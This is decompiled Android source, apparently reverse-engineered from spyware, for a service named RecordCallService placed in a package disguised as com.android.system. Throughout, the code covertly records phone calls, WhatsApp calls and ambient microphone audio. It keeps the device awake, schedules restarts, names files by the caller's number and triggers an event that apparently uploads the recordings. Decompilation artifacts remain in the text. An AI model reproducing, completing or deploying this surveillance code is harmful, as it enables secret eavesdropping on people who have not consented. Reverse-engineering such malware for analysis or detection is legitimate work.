package com.android.system;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.media.AudioFocusRequest;
import android.media.AudioManager;
import android.media.AudioManager.OnAudioFocusChangeListener;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.SystemClock;
import com.a.a.b;
import com.app.system.common.c;
import com.app.system.common.commands.StartAudioRec;
import com.app.system.common.commands.StopAudioRec;
import com.app.system.common.d.a.k;
import com.app.system.common.entity.PlannedRec;
import com.app.system.common.entity.RecStatus;
import com.app.system.common.entity.RecStatus.RecType;
import com.app.system.common.entity.RecStatus.Status;
import com.app.system.common.h;
import com.app.system.common.h.m;
import com.app.system.common.service.EventsAndReceiveService;
import java.io.File;
import java.util.Date;

public class RecordCallService
  extends Service
{
  private static volatile PowerManager.WakeLock l;
  private static volatile Object n = new Object();
  private static volatile b o;
  String a = "";
  long b;
  String c;
  String d;
  int e = 0;
  int f = -1;
  int g = -1;
  AudioFocusRequest h = null;
  long i = 0L;
  AudioManager j;
  AudioManager.OnAudioFocusChangeListener k;
  private com.app.system.common.b.a m = null;
  private Handler p = new Handler();
  private b q = new b(null);
  private a r = new a(null);
  private PlannedRec s = null;
  
  @SuppressLint({"InvalidWakeLockTag"})
  private static PowerManager.WakeLock a(Context paramContext)
  {
    if (l == null)
    {
      l = ((PowerManager)paramContext.getApplicationContext().getSystemService("power")).newWakeLock(1, "com.android.system.RecordCallService");
      l.setReferenceCounted(true);
    }
    return l;
  }
  
  public static String a(String paramString1, String paramString2)
  {
    File localFile = new File(c.f);
    if (paramString1.startsWith("2_AMBIENT")) {
      localFile = new File(localFile, "RecAmbient/");
    } else {
      localFile = new File(localFile, "RecordCall/");
    }
    StringBuilder localStringBuilder = new StringBuilder();
    localStringBuilder.append(paramString1);
    localStringBuilder.append(paramString2);
    return new File(localFile, localStringBuilder.toString()).getAbsolutePath();
  }
  
  public static void a(Context paramContext, int paramInt, PlannedRec paramPlannedRec)
  {
    SharedPreferences localSharedPreferences = paramContext.getSharedPreferences("pref", 0);
    long l1 = System.currentTimeMillis();
    long l2 = localSharedPreferences.getLong("amb-rec-stop", 0L);
    if (l2 == 0L) {
      return;
    }
    if ((l2 != -1L) && (l2 - l1 <= 5000L))
    {
      paramContext = localSharedPreferences.edit();
      paramContext.putLong("amb-rec-stop", 0L);
      paramContext.apply();
    }
    else
    {
      int i1;
      if (l2 == -1L) {
        i1 = -1;
      } else {
        i1 = (int)((l2 - l1) / 1000L);
      }
      StartAudioRec.a(paramContext, i1, paramInt, paramPlannedRec);
    }
  }
  
  private void a(final RecStatus paramRecStatus)
  {
    new Thread(new Runnable()
    {
      public void run()
      {
        new k(h.c(RecordCallService.this)).a(RecordCallService.this, paramRecStatus);
      }
    }).start();
  }
  
  private RecStatus b(String paramString1, String paramString2)
  {
    RecStatus localRecStatus = new RecStatus();
    localRecStatus.recType = RecStatus.RecType.UNKNOWN;
    String str = this.d;
    if (str != null)
    {
      int i1 = -1;
      int i2 = str.hashCode();
      if (i2 != 65)
      {
        if (i2 != 80)
        {
          if ((i2 == 87) && (str.equals("W"))) {
            i1 = 1;
          }
        }
        else if (str.equals("P")) {
          i1 = 0;
        }
      }
      else if (str.equals("A")) {
        i1 = 2;
      }
      switch (i1)
      {
      default: 
        break;
      case 2: 
        localRecStatus.recType = RecStatus.RecType.AMBIENT_REC;
        break;
      case 1: 
        localRecStatus.recType = RecStatus.RecType.WHATSAPP_CALL;
        break;
      case 0: 
        localRecStatus.recType = RecStatus.RecType.PHONE_CALL;
      }
    }
    localRecStatus.recStart = this.b;
    localRecStatus.callNumber = this.c;
    localRecStatus.status = RecStatus.Status.valueOf(paramString1);
    localRecStatus.optionalMsg = paramString2;
    return localRecStatus;
  }
  
  public static boolean b()
  {
    synchronized (n)
    {
      boolean bool;
      if ((o != null) && (o.b())) {
        bool = true;
      } else {
        bool = false;
      }
      return bool;
    }
  }
  
  private void c()
  {
    a(this, this.g, this.s);
  }
  
  public void a()
  {
    ??? = a(getApplicationContext());
    if (((PowerManager.WakeLock)???).isHeld()) {
      ((PowerManager.WakeLock)???).release();
    }
    ??? = this.p;
    if (??? != null)
    {
      ((Handler)???).removeCallbacks(this.q);
      this.p.removeCallbacks(this.r);
    }
    synchronized (n)
    {
      int i1;
      if (o != null)
      {
        o.a();
        o = null;
        i1 = 1;
      }
      else
      {
        i1 = 0;
      }
      n.notifyAll();
      Object localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      ((StringBuilder)localObject2).append("Chiamata callRecMutex.notifyAll, ");
      ((StringBuilder)localObject2).append(n.hashCode());
      com.security.d.a.d("RCService", ((StringBuilder)localObject2).toString(), new Object[0]);
      if (i1 != 0)
      {
        ??? = this.a;
        getSharedPreferences("pref", 0);
        localObject2 = this.c;
        if ((localObject2 != null) && (!((String)localObject2).isEmpty())) {
          if (this.a.startsWith("0_12345"))
          {
            localObject2 = new StringBuilder();
            ((StringBuilder)localObject2).append("0_");
            ((StringBuilder)localObject2).append(this.c);
            this.a = ((String)???).replace("0_12345", ((StringBuilder)localObject2).toString());
          }
          else if (this.a.startsWith("1_12345"))
          {
            localObject2 = new StringBuilder();
            ((StringBuilder)localObject2).append("1_");
            ((StringBuilder)localObject2).append(this.c);
            this.a = ((String)???).replace("1_12345", ((StringBuilder)localObject2).toString());
          }
        }
        localObject2 = h.c(this);
        StringBuilder localStringBuilder = new StringBuilder();
        localStringBuilder.append(this.a);
        localStringBuilder.append('_');
        localStringBuilder.append((String)localObject2);
        localStringBuilder.append('_');
        localStringBuilder.append(this.b);
        localStringBuilder.append('_');
        localStringBuilder.append(this.e);
        this.a = localStringBuilder.toString();
        ??? = new File(a((String)???, ".mp3"));
        if (((File)???).exists()) {
          ((File)???).renameTo(new File(a(this.a, "_.mp3")));
        }
      }
      return;
    }
  }
  
  public void a(String paramString, int paramInt)
  {
    try
    {
      com.security.d.a.d("RCService", "Record Call Service is Starting", new Object[0]);
      ??? = a(getApplicationContext());
      if (!((PowerManager.WakeLock)???).isHeld()) {
        ((PowerManager.WakeLock)???).acquire();
      }
      synchronized (n)
      {
        if ((o != null) && (o.b()))
        {
          com.security.d.a.a("RCService", "Registrazione già in corso!", new Object[0]);
        }
        else
        {
          b localb = new com/a/a/b;
          localb.<init>(this, paramString, paramInt);
          o = localb;
          o.start();
          if (this.g == -1) {
            paramInt = 600;
          } else {
            paramInt = this.g;
          }
          int i1 = paramInt;
          if (this.f != -1) {
            if (this.f > paramInt) {
              i1 = paramInt;
            } else {
              i1 = this.f;
            }
          }
          this.p.postDelayed(this.q, i1 * 1000);
          if (i1 > 10L) {
            this.p.postDelayed(this.r, 10000L);
          }
        }
      }
      return;
    }
    catch (Exception paramString)
    {
      a();
    }
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    this.j = ((AudioManager)getSystemService("audio"));
    this.k = new AudioManager.OnAudioFocusChangeListener()
    {
      public void onAudioFocusChange(int paramAnonymousInt)
      {
        if ((RecordCallService.b()) && ((System.currentTimeMillis() - RecordCallService.this.i < 2000L) || (RecordCallService.this.i == 0L)))
        {
          com.security.d.a.d("RCService", "IGNORO AudioManager.OnAudioFocusChangeListener", new Object[0]);
          return;
        }
        RecordCallService localRecordCallService;
        if (paramAnonymousInt == -1)
        {
          com.security.d.a.d("RCService", "AudioManager.AUDIOFOCUS_LOSS", new Object[0]);
          if (RecordCallService.b())
          {
            StopAudioRec.b(RecordCallService.this);
            localRecordCallService = RecordCallService.this;
            StopAudioRec.a(localRecordCallService, RecordCallService.a(localRecordCallService));
          }
        }
        else if (paramAnonymousInt == -2)
        {
          com.security.d.a.d("RCService", "AudioManager.AUDIOFOCUS_LOSS_TRANSIENT", new Object[0]);
          if (RecordCallService.b())
          {
            StopAudioRec.b(RecordCallService.this);
            localRecordCallService = RecordCallService.this;
            StopAudioRec.a(localRecordCallService, RecordCallService.a(localRecordCallService));
          }
        }
        else if (paramAnonymousInt == -3)
        {
          com.security.d.a.d("RCService", "AudioManager.AUDIOFOCUS_LOSS_TRANSIENT_CAN_DUCK", new Object[0]);
          if (RecordCallService.b())
          {
            StopAudioRec.b(RecordCallService.this);
            localRecordCallService = RecordCallService.this;
            StopAudioRec.a(localRecordCallService, RecordCallService.a(localRecordCallService));
          }
        }
        else if (paramAnonymousInt == 1)
        {
          com.security.d.a.d("RCService", "AudioManager.AUDIOFOCUS_GAIN - DEVO RIAVVIARE REGISTRAZIONE??????", new Object[0]);
          RecordCallService.b(RecordCallService.this);
        }
      }
    };
  }
  
  public void onDestroy() {}
  
  public void onLowMemory() {}
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    if (paramIntent != null)
    {
      Object localObject1 = new StringBuilder();
      ((StringBuilder)localObject1).append("intent.getStringExtra(\"data\"): ");
      ((StringBuilder)localObject1).append(paramIntent.getStringExtra("data"));
      com.security.d.a.d("RCService", ((StringBuilder)localObject1).toString(), new Object[0]);
      localObject1 = paramIntent.getStringExtra("data");
      Object localObject2;
      if (((String)localObject1).equals("1"))
      {
        localObject2 = paramIntent.getStringExtra("number");
        this.f = paramIntent.getIntExtra("max_dur", -1);
        this.g = paramIntent.getIntExtra("slice_dur", -1);
        Object localObject3 = new StringBuilder();
        ((StringBuilder)localObject3).append("START RECORDING WITH NUMBER: ");
        ((StringBuilder)localObject3).append((String)localObject2);
        com.security.d.a.d("RCService", ((StringBuilder)localObject3).toString(), new Object[0]);
        if (localObject2 != null)
        {
          getSharedPreferences("pref", 0);
          localObject3 = new Date();
          this.a = ((String)localObject2);
          this.b = (((Date)localObject3).getTime() / 1000L);
          this.c = ((String)localObject2);
          this.d = paramIntent.getStringExtra("call_app");
          this.i = System.currentTimeMillis();
          long l1 = paramIntent.getLongExtra("planned-rowid", 0L);
          if (l1 > 0L) {
            this.s = new m(this).a(l1);
          } else {
            this.s = null;
          }
          int i1;
          if (((String)localObject2).startsWith("0_")) {
            i1 = 0;
          } else if (((String)localObject2).startsWith("1_")) {
            i1 = 1;
          } else {
            i1 = 2;
          }
          localObject2 = a(this.a, ".mp3");
          if (i1 == 2)
          {
            if (this.j.requestAudioFocus(this.k, 1, 1) == 1) {
              a((String)localObject2, i1);
            } else {
              com.security.d.a.d("RCService", "Su request audiofocus risorsa busy", new Object[0]);
            }
          }
          else
          {
            a((String)localObject2, i1);
            this.j.requestAudioFocus(this.k, 1, 2);
          }
        }
      }
      if (((String)localObject1).equals("0"))
      {
        this.i = 0L;
        this.b = paramIntent.getLongExtra("call_time", new Date().getTime() / 1000L);
        this.e = ((int)(new Date().getTime() / 1000L - this.b));
        this.c = paramIntent.getStringExtra("call_number");
        if (paramIntent.getBooleanExtra("abort_rec", false)) {
          this.g = 0;
        }
        a(b(RecStatus.Status.COMPLETED.name(), null));
        localObject2 = new StringBuilder();
        ((StringBuilder)localObject2).append("STOP RECORDING WITH NUMBER: ");
        ((StringBuilder)localObject2).append(this.c);
        com.security.d.a.d("RCService", ((StringBuilder)localObject2).toString(), new Object[0]);
        stopSelf();
        a();
        localObject2 = new Intent(this, EventsAndReceiveService.class);
        ((Intent)localObject2).putExtra("event_core_app", "event_send_call_rec");
        com.b.a.a.a.a(this, (Intent)localObject2);
        try
        {
          Thread.sleep(4000L);
        }
        catch (InterruptedException localInterruptedException)
        {
          localInterruptedException.printStackTrace();
        }
        c();
      }
      if (((String)localObject1).equals("GIVE_FEEDBACK")) {
        a(b(paramIntent.getStringExtra("FEEDBACK_STATUS"), paramIntent.getStringExtra("FEEDBACK_MSG")));
      }
    }
    return super.onStartCommand(paramIntent, paramInt1, paramInt2);
  }
  
  public static class RestartRecReceiver
    extends BroadcastReceiver
  {
    public static void a(Context paramContext)
    {
      com.security.d.a.d("RCService", "scheduleAlarm RESTART_REC", new Object[0]);
      Intent localIntent = new Intent(paramContext, RestartRecReceiver.class);
      AlarmManager localAlarmManager = (AlarmManager)paramContext.getSystemService("alarm");
      if (localAlarmManager != null) {
        localAlarmManager.set(2, SystemClock.elapsedRealtime() + 60000L, PendingIntent.getBroadcast(paramContext, 0, localIntent, 0));
      }
    }
    
    public void onReceive(Context paramContext, Intent paramIntent)
    {
      com.security.d.a.d("RCService", "Ricevuto Allarme RESTART_REC", new Object[0]);
      RecordCallService.a(paramContext, 600, null);
    }
  }
  
  private class a
    implements Runnable
  {
    private a() {}
    
    public void run()
    {
      if (RecordCallService.b())
      {
        RecordCallService localRecordCallService = RecordCallService.this;
        RecordCallService.a(localRecordCallService, RecordCallService.a(localRecordCallService, RecStatus.Status.RECORDING.name(), null));
        if (RecordCallService.c(RecordCallService.this) != null) {
          RecordCallService.c(RecordCallService.this).postDelayed(this, 10000L);
        }
      }
    }
  }
  
  private class b
    implements Runnable
  {
    private b() {}
    
    public void run()
    {
      com.security.d.a.d("RCService", "MAXDUR scaduto - fine registrazione", new Object[0]);
      StopAudioRec.b(RecordCallService.this);
      RecordCallService localRecordCallService = RecordCallService.this;
      StopAudioRec.a(localRecordCallService, RecordCallService.a(localRecordCallService));
    }
  }
}


/* Location:              ~/com/android/system/RecordCallService.class
 *
 * Reversed by:           J
 */